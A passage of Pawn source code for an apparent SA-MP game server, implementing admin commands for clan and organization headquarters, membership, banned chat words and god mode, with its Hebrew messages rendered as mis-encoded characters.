		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(!CanBeTeleported(playerid)) return 1;
		playerinfo[playerid][teleportedhq] = 1;
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,claninfo[c][chq][0]+floatrand(-1.0,1.0),claninfo[c][chq][1]+floatrand(-1.0,1.0),claninfo[c][chq][2]);
				SetPlayerFacingAngle(playerid,claninfo[c][chq][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),claninfo[c][chqv][0]+floatrand(-3.0,3.0),claninfo[c][chqv][1]+floatrand(-3.0,3.0),claninfo[c][chqv][2],playerid);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),claninfo[c][chqv][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),0);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),0);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,0);
		SetPlayerVirtualWorld(playerid,0);
		format(string,sizeof(string),"~y~]~h~%s ~n~~h~headquarter~y~]",claninfo[c][cname]);
		GameTextForPlayer(playerid,string,1500,4);
		format(string,sizeof(string)," !%s с°хъ фср ьюЇўу·",claninfo[c][cname]);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string),"<ADMIN> teleported to %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/clanmsg") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /clanmsg [clan name] [view/edit/delete] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		cmd = strtok(cmdtext,idx);
		if(equal(cmd,"view"))
		{
			if(strlen(claninfo[c][cmessage]) <= 1) return SendClientMessage(playerid,red," .рщя фхуЄ· ўьря");
			format(string,sizeof(string)," ╗ Clan %s Message: %s",claninfo[c][cname],claninfo[c][cmessage]);
			SendClientMessage(playerid,purple,string);
		}
		else if(equal(cmd,"edit"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /clanmsg [clan name] edit [text] :Ўх°· ф∙щюх∙");
			if(strlen(cmd) < 2) return SendClientMessage(playerid,red," .ффхуЄф ўЎ°ф юущ, ющЁщюхэ 2 ·хщэ");
			if(strlen(cmd) > 100) return SendClientMessage(playerid,red," .ффхуЄф р°хыф юущ, юўёщюхэ 100 ·хщэ");
			format(claninfo[c][cmessage],128,cmd);
			format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
			fsetstring(string,"Message",cmd);
			format(string,sizeof(string)," :∙щЁф р· фхуЄ· фўьря ∙ьъ ь %s фрующя",GetName(playerid));
			format(cmd,sizeof(cmd)," ╗ New Clan Message: %s",cmd);
			for(new i = 0; i < claninfo[c][cmembers]; i++)
			{
				SendClientMessage(claninfo[c][cplayers][i],purple,string);
				SendClientMessage(claninfo[c][cplayers][i],purple,cmd);
			}
			SendClientMessage(playerid,green," :фхуЄ· фўьря ∙хЁ·ф ь");
			SendClientMessage(playerid,green,cmd);
		}
		else if(equal(cmd,"delete"))
		{
			if(strlen(claninfo[c][cmessage]) <= 1) return SendClientMessage(playerid,red," .рщя фхуЄ· ўьря");
			claninfo[c][cmessage][0] = 'x', claninfo[c][cmessage][1] = 0;
			format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
			fsetstring(string,"Message","x");
			format(string,sizeof(string)," .ючў р· фхуЄ· фўьря ∙ьъ %s фрующя",GetName(playerid));
			for(new i = 0; i < claninfo[c][cmembers]; i++) SendClientMessage(claninfo[c][cplayers][i],orange,string);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		format(string,sizeof(string),"<ADMIN> sent %s clan message command: %s",claninfo[c][cname],cmdtext);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/loadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /loadhq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф ыс° щ∙ юЇўуф");
		if(GetClanHQ(c) == -1) return SendClientMessage(playerid,red," .ўьря цф ьр °ы∙ юЇўуф");
		LoadClanHeadquarter(c, GetClanHQ(c));
		format(string,sizeof(string)," ** !{%s}%s" @c(green) " шЄя р· юЇўу· фўьря %s фрующя",ClanHexColor(c),claninfo[c][cname],GetName(playerid));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string),"<ADMIN> loaded headquarter: %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/unloadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /unloadhq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф рщя юЇўуф");
		if(GetClanHQ(c) == -1) return SendClientMessage(playerid, red, " .ьўьря цф рщя юЇўуф");
		UnloadClanHeadquarter(c);
		format(string,sizeof(string)," ** !{%s}%s" @c(green) " фёщ° р· юЇўу· фўьря %s фрующя",ClanHexColor(c),claninfo[c][cname],GetName(playerid));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string),"<ADMIN> unloaded headquarter: %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/reloadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /reloadhq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф рщя юЇўуф");
		if(GetClanHQ(c) == -1) return SendClientMessage(playerid, red, " .ьўьря цф рщя юЇўуф");
		UnloadClanHeadquarter(c);
		new total = LoadClanHeadquarter(c, GetClanHQ(c));
		if(!total) return SendClientMessage(playerid,red," .фюЇўуф фўщщю· фхё°ф, рсь ьр ўщщю· юЇўуф чу∙ф ьфЄьх·");
		format(string,sizeof(string)," ** !{%s}%s" @c(green) " Єуыя (шЄя ючу∙) р· юЇўу· фўьря %s фрующя",ClanHexColor(c),claninfo[c][cname],GetName(playerid));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string),"<ADMIN> reloaded headquarter: %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/lockhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /lockhq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф рщя юЇўуф");
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
		if(fgetint(string,"LockHQ")) return SendClientMessage(playerid,red," .фюЇўуф ∙ь фўьря фцф ыс° ЁЄхьф");
		fsetint(string,"LockHQ",1);
		format(string,sizeof(string)," .ыЄ· фщр ьр ··ххёє ы∙ф∙°· Єхьф ,%s ЁЄь· р· юЇўу· фўьря",claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		format(string,sizeof(string),"<ADMIN> locked headquarter: %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/unlockhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /unlockhq [clan name] :Ўх°· ф∙щюх∙");
		c = clannumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(claninfo[c][cprotected] && !playerinfo[playerid][pp] && playerinfo[playerid][admin] < 18) return SendClientMessage(playerid,red," .ўьря цф юхтя");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф рщя юЇўуф");
		format(string,sizeof(string),"/DM/Clans/%s.ini",claninfo[c][cname]);
		if(!fgetint(string,"LockHQ")) return SendClientMessage(playerid,red," .фюЇўуф ∙ь фўьря фцф ьр ЁЄхьф");
		fsetint(string,"LockHQ",0);
		format(string,sizeof(string)," .%s фё°· р· фЁЄщьф ююЇўу· фўьря",claninfo[c][cname]);
		SendClientMessage(playerid,green,string);
		AdminInfo(playerid,cmdtext);
		format(string,sizeof(string),"<ADMIN> unlocked headquarter: %s",claninfo[c][cname]);
		Log("Clans",playerid,string);
		return 1;
	}
	if(equal(cmd,"/createorg") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new name[256], string[M_S], orgid, Float:p[4];
		name = strtok(cmdtext,idx);
		if(name[0] == ' ') strdel(name,0,1);
		if(!strlen(name)) return SendClientMessage(playerid,white," /createorg [org name] :Ўх°· ф∙щюх∙");
		if(strlen(name) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red," .∙э р°хъ юущ");
		for(new i=0;i<strlen(name);i++) if(name[i] < '0' && name[i] > '9' && name[i] < 'a' && name[i] > 'z' && name[i] < 'A' && name[i] > 'Z' && name[i] != '_' && name[i] != '[' && name[i] != ']') return SendClientMessage(playerid,red," .чьў юфрх·щх· сыщЁхщ ∙ы·с· ьр щыхьх· ьфыЁё ь∙э ∙ь р°тхя");
		format(string,sizeof(string),"/DM/Organizations/%s.ini",name);
		if(fexist(string)) return SendClientMessage(playerid,red," .фр°тхя фцф ыс° ўщщэ");
		orgid = GetEmptyOrgID();
		if(orgid == -1) return SendClientMessage(playerid,red," .(ьр Ёщ·я ьщЎх° р°тхЁщэ (ыюх· тсхфф юущ");
		fcreate(string);
		fsetint(string,"ID",orgid);
		fsetstring(string,"Name",name);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		fsetfloat(string,"X",p[0]);
		fsetfloat(string,"Y",p[1]);
		fsetfloat(string,"Z",p[2]);
		fsetfloat(string,"Rot",p[3]);
		fsetfloat(string,"VX",p[0]);
		fsetfloat(string,"VY",p[1]);
		fsetfloat(string,"VZ",p[2]);
		fsetfloat(string,"VR",p[3]);
		format(orginfo[orgid][oname],M_S,name);
		orginfo[orgid][orgvalid] = 1;
		fsetstring(string,"Command",name);
		format(orginfo[orgid][ocmd],M_S,name);
		format(string,sizeof(string)," .\"%s\" щЎ°· р· фр°тхя",name);
		SendClientMessage(playerid,green,string);
		fsetint(file_orgs,"Count",GetHighestOrgID()+1);
		valstr(string,orgid);
		fsetstring(file_orgs,string,name);
		return 1;
	}
	if(equal(cmd,"/dorg") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new string[M_S], orgid;
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /dorg [org name] :Ўх°· ф∙щюх∙");
		orgid = orgnumber(cmd);
		if(!orgid) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		orginfo[orgid][orgvalid] = 0;
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && playerinfo[i][org] == orgid)
		{
			PlayerLeaveOrg(i);
			SendClientMessage(i,red," .фрующя ючў р· фр°тхя ∙ьъ");
		}
		format(string,sizeof(string),"/DM/Organizations/%s.ini",cmd);
		fremove(string);
		valstr(string,orgid);
		fsetstring(file_orgs,string,"None");
		format(string,sizeof(string)," .\"%s\" ючў· р· фр°тхя",cmd);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/setorg") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], id, c, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /setorg [id/name] [org name / None] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][org] && !equal(cmd2,"None")) return SendClientMessage(playerid,red," .ф∙чўя ∙сч°· ыс° ср°тхя");
		c = equal(cmd2,"None") ? -1 : orgnumber(cmd2);
		if(!c) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		if(c == -1)
		{
			if(!playerinfo[id][org]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф ьр ср°тхя");
			format(string,sizeof(string)," .\"%s\" юфр°тхя %s фхЎр· р·",orginfo[playerinfo[id][org]][oname],GetName(id));
			SendClientMessage(playerid,green,string);
			PlayerLeaveOrg(id);
			SendClientMessage(id,red," .фрующя фхЎщр рх·ъ юфр°тхя ∙ьъ");
		}
		else
		{
			format(string,sizeof(string)," .Ўх°є ьр°тхя ∙ьъ Єь щущ фрующя %s",GetName(id));
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][org] == c) SendClientMessage(i,green,string);
			playerinfo[id][org] = c;
			format(string,sizeof(string)," .Єь щущ фрующя \"%s\" Ўх°Ї· ьр°тхя",orginfo[c][oname]);
			SendClientMessage(id,green,string);
			format(string,sizeof(string)," .\"%s\" ьр°тхя %s Ўщ°Ї· р·",orginfo[c][oname],GetName(id));
			SendClientMessage(playerid,green,string);
			if(playerinfo[id][logged]) fsetint(fuser(id),"Org",playerinfo[id][org]);
			playerinfo[id][iorg] = 0, playerinfo[id][lorg] = 1;
		}
		return 1;
	}
	if(equal(cmd,"/setlorg") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], id, lvl, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setlorg [id/name] [level 1 - 3] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][org] == 0)
		{
			format(string,sizeof(string)," .ьр ср°тхя %s",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		lvl = strval(cmd2);
		if(lvl < 1 || lvl > 3) return SendClientMessage(playerid,red," .°ю· тщ∙х· ∙тхщф");
		if(playerinfo[id][lorg] == lvl) return SendClientMessage(playerid,red," .фю∙·ю∙ ыс° ЁюЎр с°ю· фтщ∙х· ∙ЎщщЁ·");
		format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· фтщ∙х· ∙ьъ ср°тхя ь°юф %d",lvl);
		SendClientMessage(id,green,string);
		format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· °ю· фтщ∙х· ср°тхя ∙ь",lvl,GetName(id));
		SendClientMessage(playerid,green,string);
		playerinfo[id][lorg] = lvl;
		if(playerinfo[id][logged]) fsetint(fuser(id),"OrgLevel",lvl);
		return 1;
	}
	if(equal(cmd,"/orgname") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new cmd2[256], c, string[M_S], string2[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2)) return SendClientMessage(playerid,white," /orgname [old name] [new name] :Ўх°· ф∙щюх∙");
		c = orgnumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		format(string,sizeof(string),"/DM/Organizations/%s.ini",orginfo[c][oname]);
		format(string2,sizeof(string2),"/DM/Organizations/%s.ini",cmd2);
		if(fexist(string2)) return SendClientMessage(playerid,red," .фр°тхя фцф ыс° ўщщэ");
		frename(string,string2);
		valstr(string2,c);
		fsetstring(file_orgs,string2,cmd2);
		format(orginfo[c][oname],256,cmd2);
		format(string2,sizeof(string2),"/DM/Organizaitons/%s.ini",cmd2);
		fsetstring(string2,"Name",cmd2);
		format(string,sizeof(string)," .%s ∙щЁщ· р· ф∙э ∙ь р°тхя юёЇ° %d ь",cmd2,c);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/oloadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /oloadhq [org name] :Ўх°· ф∙щюх∙");
		c = orgnumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		if(orginfo[c][ohashq]) return SendClientMessage(playerid,red," .ьр°тхя фцф ыс° щ∙ юЇўуф");
		new total = LoadOrgHeadquarter(c);
		if(!total) return SendClientMessage(playerid,red," .ьр ўщщю· юЇўуф");
		format(string,sizeof(string)," ** !%s" @c(green) " шЄя р· юЇўу· фр°тхя %s фрующя",orginfo[c][oname],GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/ounloadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /ounloadhq [org name] :Ўх°· ф∙щюх∙");
		c = orgnumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		if(!orginfo[c][ohashq]) return SendClientMessage(playerid,red," .ьр°тхя фцф рщя юЇўуф");
		UnloadOrgHeadquarter(c);
		format(string,sizeof(string)," ** !%s" @c(green) " фёщ° р· юЇўу· фр°тхя %s фрующя",orginfo[c][oname],GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/oreloadhq") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 11 && !PlayerHasRank(playerid,RankID("юЁфьщ р°тхЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 11");
		new c, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /oreloadhq [org name] :Ўх°· ф∙щюх∙");
		c = orgnumber(cmd);
		if(!c) return SendClientMessage(playerid,red," .р°тхя ∙тхщ");
		if(!orginfo[c][ohashq]) return SendClientMessage(playerid,red," .ьр°тхя фцф рщя юЇўуф");
		UnloadOrgHeadquarter(c);
		new total = LoadOrgHeadquarter(c);
		if(!total) return SendClientMessage(playerid,red," .фюЇўуф фўщщю· фхё°ф, рсь ьр ўщщю· юЇўуф чу∙ф ьфЄьх·");
		format(string,sizeof(string)," ** !%s" @c(green) " Єуыя (шЄя ючу∙) р· юЇўу· фр°тхя %s фрующя",orginfo[c][oname],GetName(playerid));
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/antiword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		new string[M_S], File:fwords;
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /antiword [word] :Ўх°· ф∙щюх∙");
		if(strlen(cmd) > 12) return SendClientMessage(playerid,red," .фющьф р°хыф юущ");
		fwords = fopen(file_words,fexist(file_words)? io_read:io_readwrite);
		while(fread(fwords,string)) if(equal(cmd,string)) return SendClientMessage(playerid,red," .фющьф фцх ыс° ЁюЎр· с°∙щюф");
		fclose(fwords);
		SendClientMessage(playerid,green," :фхёЇ· ьюЄ°ы· фЎщЁцх° р· фющьф");
		SendClientMessage(playerid,green,cmd);
		format(string,sizeof(string),"%s\r\n",cmd);
		fwords = fopen(file_words,io_append);
		fwrite(fwords,string);
		fclose(fwords);
		format(words[words_count++],sizeof(words[]),cmd);
		return 1;
	}
	if(equal(cmd,"/uantiword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		new File:fwords, wstring[128];
		words_count = 0;
		fwords = fopen(file_words,io_read);
		while(fread(fwords,wstring))
		{
			fixchars(wstring);
			for(new i = 0, j = strlen(wstring); i < j; i++) if(wstring[i] == '\n' || wstring[i] == '\r') wstring[i] = '\0';
			format(words[words_count++],sizeof(words[]),wstring);
		}
		SendClientMessage(playerid,green," .юЄ°ы· фЎЁцх° ЄхуыЁф");
		return 1;
	}
	if(equal(cmd,"/givecc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /givecc [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(playerinfo[id][ccard])
		{
			format(string,sizeof(string)," .ыс° щ∙ ы°шщё р∙°рщ %s ь",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][ccard] = 1;
		format(string,sizeof(string)," .%s Ё·· ы°шщё р∙°рщ ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .ўщсь· юфрующя ы°шщё р∙°рщ");
		if(playerinfo[id][logged]) fsetint(fuser(id),"CCard",1);
		return 1;
	}
	if(equal(cmd,"/removecc") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /removecc [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(!playerinfo[id][ccard])
		{
			format(string,sizeof(string)," .рщя ы°шщё р∙°рщ %s ь",GetName(id));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		playerinfo[id][ccard] = 0;
		format(string,sizeof(string)," .%s ючў· р· ы°шщё фр∙°рщ ∙ь",GetName(id));
		SendClientMessage(playerid,green,string);
		SendClientMessage(id,green," .фрующя ючў р· ы°шщё фр∙°рщ ∙ьъ");
		if(playerinfo[id][logged]) fsetint(fuser(id),"CCard",0);
		return 1;
	}
	if(equal(cmd,"/godmod") && IsPlayerMAdmin(playerid))
	{
		cmd = strtok(cmdtext,idx);
		if(playerinfo[playerid][admin] < 12 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 12");
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /godmod [on/off] :Ўх°· ф∙щюх∙");
		new v = -1;
		if(IsPlayerInAnyVehicle(playerid)) v = GetPlayerVehicleID(playerid);
		if(equal(cmd,"on"))
		{
			if(playerinfo[playerid][gm]) return SendClientMessage(playerid,red," .р·ф ыс° сюЎс тхуюху");
			SetPlayerHealth(playerid,INFINITY);
			if(v != -1)
			{
				SetVehicleHealth(v,10000.0);
				vehicleinfo[v][vgm] = 1;
			}
			playerinfo[playerid][gm] = 1;
			SendClientMessage(playerid,green," .юЎс тхуюху фхЇЄь");
			PlaySound(playerid,1057);
		}
		else if(equal(cmd,"off"))
		{
			if(!playerinfo[playerid][gm]) return SendClientMessage(playerid,red," .р·ф ьр сюЎс тхуюху");
			SetPlayerHealth(playerid,100.0);
			if(v != -1)
			{
				SetVehicleHealth(v,1000.0);
